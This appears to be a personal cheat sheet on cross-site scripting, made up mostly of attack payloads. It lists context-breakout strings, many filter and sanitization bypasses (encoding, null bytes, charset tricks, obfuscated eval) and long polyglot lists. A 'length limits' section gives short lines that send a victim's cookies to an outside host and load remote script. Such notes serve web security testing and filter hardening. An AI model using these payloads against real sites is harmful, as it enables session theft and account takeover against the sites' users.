`Note` `My notes on XSS for personal reference`

## 𝐗𝐒𝐒 𝐓𝐲𝐩𝐞𝐬

![XSS](https://user-images.githubusercontent.com/68887544/179921615-68aef3f0-3f23-450f-9fa8-2b93b690bb75.png)


# 𝐑𝐞𝐟𝐥𝐞𝐜𝐭𝐞𝐝 𝐗𝐒𝐒

## 𝐅𝐢𝐧𝐝𝐢𝐧𝐠 𝐑𝐞𝐟𝐥𝐞𝐜𝐭𝐞𝐝 𝐗𝐒𝐒
```
1. Submit a random string for example: myxssteststring
2. Identify all locations where this string is reflected in the application’s response
3. For each reflection, identify the syntactic context in which the reflected data appears.
4. Modify the payload accordingly to get an XSS.
5. If input is sanitized or filtered in anyway, try modifying your payload to make it 
circumvent the defense mechanism.
```

- XSS Filter Test String:
```
 !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~XSSfilterteststring
```

- Best XSS PolyGlot (Credit: BruteLogic):
```
JavaScript://%250Aalert?.(1)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--> </Title/</Style/</Script/</textArea/</iFrame/</noScript> \74k<K/contentEditable/autoFocus/OnFocus= /*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
```

## 𝐂𝐨𝐦𝐦𝐨𝐧 𝐑𝐞𝐟𝐥𝐞𝐜𝐭𝐢𝐨𝐧 𝐏𝐨𝐬𝐢𝐭𝐢𝐨𝐧𝐬


![Common Reflection Positions](https://user-images.githubusercontent.com/68887544/179921399-fd02889c-d051-4876-bdfc-fb8484de0090.png)

> - When reflection is in the tag attribute
> ```
> "><script>alert(1)</script>
> " onfocus="alert(1)
> ```
>
> - Reflection is in a javascript string
> ```
> '; alert(1); var foo='
> ```
> 
> - Reflection is in an attribute containing URL
> ```
> javascript:alert(1);
> #"onclick="javascript:alert(1)
> ```

## 𝐁𝐞𝐚𝐭𝐢𝐧𝐠 𝐃𝐞𝐟𝐞𝐧𝐬𝐢𝐯𝐞 𝐅𝐢𝐥𝐭𝐞𝐫𝐬

![Defensive Filters](https://user-images.githubusercontent.com/68887544/179924065-d8766d18-fe90-40cb-8b46-23db6c3f03a6.png)

- When direct use of `<script>` tags are blocked
```
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click here</a>

where, base 64 encoded string is <script>alert(1)</script>
```

- When `<script>` is blocked but Event Handlers are allowed
```
<xml onreadystatechange=alert(1)>
<style onreadystatechange=alert(1)>
<iframe onreadystatechange=alert(1)>
```
```
<object onerror=alert(1)>
<object type=image src=valid.gif onreadystatechange=alert(1)></object>
<img type=image src=valid.gif onreadystatechange=alert(1)>
<input type=image src=valid.gif onreadystatechange=alert(1)>
<isindex type=image src=valid.gif onreadystatechange=alert(1)>
<script onreadystatechange=alert(1)>
<bgsound onpropertychange=alert(1)>
<body onbeforeactivate=alert(1)>
<body onactivate=alert(1)>
<body onfocusin=alert(1)>
```
```
<input autofocus onfocus=alert(1)>
<input onblur=alert(1) autofocus><input autofocus>
<body onscroll=alert(1)><br><br>...<br><input autofocus>
```
> - Event Handler in a closing tag:
```
</a onmousemove=alert(1)>
```
```
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
```

- When `<script>` is blocked but script pseudo protocl i.e. `javascript:alert(1)` is allowed
```
<object data=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<form id=test /><button form=test formaction=javascript:alert(1)>
<event-source src=javascript:alert(1)>
```

- Using dynamically evaluated styles:
```
<x style=x:expression(alert(1))>
<x style=behavior:url(#default#time2) onbegin=alert(1)>
```

- Others:
```
<iMg onerror=alert(1) src=a>
<[%00]img onerror=alert(1) src=a>
<i[%00]mg onerror=alert(1) src=a>

where [%00] is null byte character


<img/onerror=alert(1) src=a>
<img[%09]onerror=alert(1) src=a>
<img[%0d]onerror=alert(1) src=a>
<img[%0a]onerror=alert(1) src=a>
<img/”onerror=alert(1) src=a>
<img/’onerror=alert(1) src=a>
<img/anyjunk/onerror=alert(1) src=a>
<script/anyjunk>alert(1)</script>
```

- When event handlers are blocked
```
<img o[%00]nerror=alert(1) src=a>
```

- When double quote and single quotes are blocked but backticks are allowed
```
<img onerror=`alert(1)`src=a>
```

- If filter checks attribute starting with `on`
```
<img src=`a`onerror=alert(1)>
<img/onerror=”alert(1)”src=a>
```

- When `alert()` is blocked
```
<img onerror=a[%00]lert(1) src=a>
<img onerror=a&#x6c;ert(1) src=a>

<img onerror=a&#x06c;ert(1) src=a>
<img onerror=a&#x006c;ert(1) src=a>
<img onerror=a&#x0006c;ert(1) src=a>
<img onerror=a&#108;ert(1) src=a>
<img onerror=a&#0108;ert(1) src=a>
<img onerror=a&#108ert(1) src=a>
<img onerror=a&#0108ert(1) src=a>

```

- If `javascript:` is blocked
```
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
```

- When application performs double url decoding of input
```
%253cimg%20onerror=alert(1)%20src=a%253e
```

- When angle brackets are blocked, you can use double-angle quotation marks  (`%u00AB` and `%u00BB`) instead of tag brackets
```
«img onerror=alert(1) src=a»
```

- When input filter identify HTML tags by matching opening and closing brackets
```
<<script>alert(1);//<</script>
<script<{alert(1)}/></script>
```

- When you can control `content-type` or `charset` header 
```
// UTF-7 encoded
+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-

// US-ASCII encoded
BC 73 63 72 69 70 74 BE 61 6C 65 72 74 28 64 6F ; ¼script¾alert(do
63 75 6D 65 6E 74 2E 63 6F 6F 6B 69 65 29 BC 2F ; cument.cookie)¼/
73 63 72 69 70 74 BE ; script¾


// UTF-16 encoded
FF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 ; ÿþ<.s.c.r.i.p.t.
3E 00 61 00 6C 00 65 00 72 00 74 00 28 00 64 00 ; >.a.l.e.r.t.(.d.
6F 00 63 00 75 00 6D 00 65 00 6E 00 74 00 2E 00 ; o.c.u.m.e.n.t...
63 00 6F 00 6F 00 6B 00 69 00 65 00 29 00 3C 00 ; c.o.o.k.i.e.).<.
2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 ; /.s.c.r.i.p.t.>.


```

- When double quotes i.e quotation marks are blocked you can use `[%f0]`
- When input containing angle brackets are blocked you can use `“onload=alert(1);`

- Using javascript functions to bypass `alert()`
```
<script>a\u006cert(1);</script>
<script>eval(‘a\u006cert(1)’);</script>
<script>eval(‘a\x6cert(1)’);</script>
<script>eval(‘a\154ert(1)’);</script>
<script>eval(‘a\l\ert\(1\)’);</script>
<script>eval(‘al’+’ert(1)’);</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
<script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>
<script>’alert(1)’.replace(/.+/,eval)</script>
<script>function::[‘alert’](1)</script>
```

- If dots are blocked:
```
<script>alert(document[‘cookie’])</script>
<script>with(document)alert(cookie)</script>
```

- Combining multiple bypass techniques
```
<img onerror=eval(‘al&#x5c;u0065rt(1)’) src=a>
<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>
```

## 𝐁𝐞𝐚𝐭𝐢𝐧𝐠 𝐒𝐚𝐧𝐢𝐭𝐢𝐳𝐚𝐭𝐢𝐨𝐧

- If first occurence of `<script>` is being stripped:
```
<script><script>alert(1)</script>
```

- If the sanitization is being performed recursively
```
<scr<script>ipt>alert(1)</script>
```

- If the filter strips `<script>` recursively and then `<object>` recursively
```
<scr<object>ipt>alert(1)</script>
```

- If quotation marks are being sanitized using `\`, try to check if `\` itself is being escaped or not. If not:
```
foo\'; alert(1);//
```

- Here, if you fi nd that the backslash character is also being properly escaped, but angle brackets are returned unsanitized, you can use the following attack:
```
</script><script>alert(1)</script>

The attack works because browsers’ parsing of HTML
tags takes precedence over their parsing of embedded JavaScript
```

- If you can inject into a script, but you cannot use quotation marks because these are being escaped, you can use the `String.fromCharCode` technique to construct strings without the need for delimiters

- In cases where the script you are injecting into resides within an event handler, rather than a full script block, you may be able to HTML-encode your quotation marks to bypass the application’s sanitization and break out of the string you control.
```
foo&apos;; alert(1);//
```

## 𝐁𝐞𝐚𝐭𝐢𝐧𝐠 𝐋𝐞𝐧𝐠𝐭𝐡 𝐋𝐢𝐦𝐢𝐭𝐬

- if you are injecting into an existing script, the following 28-byte command transmits the user’s cookies to the server with hostname `a`:
```
open("//a/"+document.cookie)
```

- if you are injecting straight into HTML, the following 30-byte tag loads and executes a script from the server with hostname `a`:
```
<script src=http://a></script>
```

# 𝐒𝐭𝐨𝐫𝐞𝐝 𝐗𝐒𝐒

## 𝐅𝐢𝐧𝐝𝐢𝐧𝐠 𝐒𝐭𝐨𝐫𝐞𝐝 𝐗𝐒𝐒

- Submit unique value to each parameter and make note of every place where they are being reflected.
- Each place might have their own different sanitization in place
- If there is a file upload or download functionality, always probe it for stored xss.

# 𝐏𝐚𝐲𝐥𝐨𝐚𝐝𝐬
## 𝐏𝐨𝐥𝐲𝐠𝐥𝐨𝐭𝐬

- Source: `https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626`
```
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert()//>
javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/--><svg/onload=/*<html/*/onmouseover=alert()//> 
javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg onload=/*<html/*/onmouseover=alert()//>
javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert()//'>` 
javascript:`/*\"/*--><svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
javascript:"/*'//`//\"//</template/</title/</textarea/</style/</noscript/</noembed/</script/--><script>/<i<frame */ onload=alert()//</script>
javascript:"/*`/*\"/*'/*</stYle/</titLe/</teXtarEa/</nOscript></noembed></template></script/--><ScRipt>/*<i<frame/*/ onload=alert()//</Script> 
javascript:`</template>\"///"//</script/--></title/'</style/</textarea/</noembed/</noscript><<script/>/<frame */; onload=alert()//<</script>`
javascript:`</template>\"///"//</script/--></title/'</style/</textarea/</noembed/</noscript><<script/>/<frame */; onload=alert()//<</script>` 
javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame <svg"///*/ onload=alert()//</script> 
javascript:/*"//'//`//\"//--></script></title></style></textarea></template></noembed></noscript><script>//<frame/<svg/*/onload= alert()//</script> 
javascript:/*-->'//"//`//\"//</title></textarea></style></noscript></script></noembed></template><script>/*<frame/<svg */ onload=alert()//</script> 
javascript:/*"/*'/*`/*\"/*</script/</title/</textarea/</style/</noscript></template></noembed>--><script>/*<svg <frame */ onload=alert()//</script> 
javascript:/*"/*'/*\"/*`/*--></title></noembed></template></textarea></noscript></style></script><script>//<frame <svg */ onload=alert()//</script> 
javascript:/*"/*`/*'/*\"/*--></title></script></textarea></noscript></style></noembed></template><script> /*<svg <frame onload=/**/alert()//</script>
javascript:"/*'//`//\"//</title></template/</textarea/</style/</noscript/</noembed/</script>--><<script>alert()<</script><frame/*/ onload=alert()//>
javascript:alert()"//</title></textarea></style></noscript></noembed></template></script>\"//'//`//--><script>//<svg <frame */onload= alert()//</script>
javascript:/*"/*`/*'/*\"/*</script></style></template></select></title></textarea></noscript></noembed><frame/onload=alert()--><<svg/*/ onload=alert()//>
javascript:"/*`/*\"/*' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert()//--><<sVg/onload=alert``> 
javascript:/*--></script></textarea></style></noscript>\"</noembed>[`</template>["</select>['</title>]<<script>///<frame */ onload=alert()//<</script>
javascript:"/*\"/*'/*`/*--></noembed></template></noscript></title></textarea></style></script></select><frame/onload=alert()><<svg/onload= /**/alert()//>
javascript:/*"/*`/*'/*\"/*--></title></textarea></noscript></noembed></template></style></script><<script> /**/alert()//<</script><frame onload=alert()>
javascript:"/*\"/*'/*--></title></textarea></style></noscript></template></noembed></script><<script>/*` /*<frame src=javascript:/**/alert()//><</script>
javascript:"/*'/*\"/*` /**/alert()//--></title></textarea></style></noscript></noembed></template></script><script>alert()</script><svg/<frame/onload=alert()>
javascript:/*"/*`/*'/*\"/*-->*/ alert()//</title></textarea></style></noscript></noembed></template></script></select><frame/onload=alert``><<svg/onload=alert()>
javascript:`/*</title></style></textarea></noscript></script></noembed></template></select/"/'/*--><frame onload=alert()><svg/\"/*<svg onload=' /**/-alert()//'>javascript:/*`/*\"/*'/*</noembed>"/*<frame src=javascript:/**/;alert()//--></title></textarea></style></noscript></template></select></script><<svg/onload= alert()//>
javascript:alert()//"/*`/*'/*\"/*--></title></textarea></noscript></noembed></template></style></script>*/ alert()//<frame onload=alert()><<script>alert()<</script>
javascript:alert()//'//"//\"//-->`//*/ alert();//</title></textarea></style></noscript></noembed></template><frame onload=alert()></select></script><<svg onload=alert()>
javascript:/*"/*\"/*`/*'/**/ (alert())//</title></textarea></style></noscript></script></noembed></template></select><frame src=javascript:alert()--><<svg/onload=alert()>
javascript:/*"/*'/*\"/*`/*><frame src=javascript:alert()></template </textarea </title </style </noscript </noembed </script --><<script>alert()<</script>\ /**/alert()//
javascript:/*`/*'/*'/*"-/*\"/**/ alert()//></title></textarea></style></select></script></noembed></noscript></template>--><<svg/onload=alert()><frame/src=javascript:alert()>
javascript:'/*`/*'/*"/*\"/*<FRAME SRC= javascript:/**/-alert()//--></title></textarea></style></noscript></noembed></template></script><script>//<svg onload= alert()//</script>
javascript:alert()//--></title></style></noscript></noembed></template></select></textarea><frameset onload=alert()></script>*///\"//`//'//"//><svg <svg onload=alert()> alert()//
javascript:alert()//'//"//\"; '/`/*\/*'/*"/**/(alert())//</style></template/</title/</textarea/</noscript/</noembed/</script>--><frame <svg onload=alert()><script>alert()</script>
javascript:/*"/*'/*`/*\"/**/ alert()//*</title></textarea></style></noscript></noembed></template></option></select></SCRIPT>--><<svg onload=alert()><frame src=javascript:alert()>
javascript:alert()//\"//`//'//"//--></style></select></noscript></noembed></template></title></textarea></script><iframe/srcdoc="<svg/onload=alert()>"><frame/onload=alert()>*/ alert()//
javascript:alert()//*-->*`/*'/*"/*\"/*</title></textarea></style></noscript></noembed></template><frame src=javascript:alert()></script><script>/*<svg onload=alert()>*/ alert()//</script>
jaVasCript:/*`/*\`/*'/*\"//"/**/(onload=alert())//<svg/onload=alert()><frame/onload=alert()></select></noscript></noembed></template></stYle/</titLe/</teXtarEa/</script/--><sVg/oNloAd= alert()//>
javascript:alert()//'//"//`//></a></option></select></template></noscript></script></title></style></textarea></noembed>--><<svg onload=alert()>\">alert()//*/ alert()//<frame src=javascript:alert()>
javascript:alert()//\ /*<svg/onload=';alert();'></textarea></style></title></noscript></template></noembed><frame onload=";alert();"></script>--><script>alert`;alert();`</script>*/alert()//\";alert()//
javascript:alert/*`/*\/*'/*\"/*"/**/(alert())// alert()//--></template><frame/onload=alert() <img src=x onerror=alert()></style/</title/</textarea/</noscript/</noembed/</script><script>alert()</script>
javascript:alert();//</title></noscript></noembed></template></style></textarea><frameset onload='+/"/+/[*/[]/+alert()//'-->\" alert();/*`/**/(/**/alert())//<script>alert()</script><<svg onload=alert()>>
javascript:alert()//*/alert()/*'-/"/-eval(`(alert())`)//\"-alert()//--></title></style></noscript></textarea></template></noembed><script>alert()</script><frameset onload=alert()><svg/onload=alert(1)> alert()//
javascript:alert()//\";alert();/*-/*`/*\`/*'/*"/**///--><FRAME SRC="javascript:alert();"></textarea></style></noscript></noembed></template></option></select></script></title><svg/onload=alert()><svg/onload=alert()> alert(1)// 
javascript:alert()//<frame/src=javascript:alert()><svg/onload=alert()>`;alert()`';alert()//\";alert();//"//--></title></textarea></style></noscript></noembed></template></option></select></script><svg onload=alert()>*/ alert()//* 
javascript:alert()//</title></style></textarea></noscript></template></noembed><script>alert()</script>-->\";alert()//";alert()//';alert()//<script>alert()</script><frame src="javascript:alert()">` alert()//<svg/onload=alert()>*/alert()/* 
javascript:alert();//<img src=x:x onerror=alert(1)>\";alert();//";alert();//';alert();//`;alert();// alert();//*/alert();//--></title></textarea></style></noscript></noembed></template></select></script><frame src=javascript:alert()><svg onload=alert()><!-- 
javascript:/*--></title></style></template></noscript></noembed></textarea></script><svg/onload='+/"/+/onclick=1/+/[*/[]/+alert()//'>"><svg/onload=`+/"/+/onclick=/+/[*/[]/+alert()//'>"><script>alert()</script><frame src="javascript:alert()"></frameset>+\"; alert()//<img src onerror=alert()>
javascript:alert(1)//\";alert(1);<!--jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC="javascript:alert(1);"></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert(1)></title><script>alert(1)</script><img src=0 onerror=alert(1)><img src=x:x onerror=alert(1)> alert(1)// 
```

- Source: `https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot`
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```


## 𝐑𝐞𝐟𝐞𝐫𝐞𝐧𝐜𝐞𝐬:

- Web Application Hacker's Handbook 
  - Finding and Exploiting Reflected XSS Vulnerabilities
  - Finding and Exploiting Stored XSS Vulnerabilities

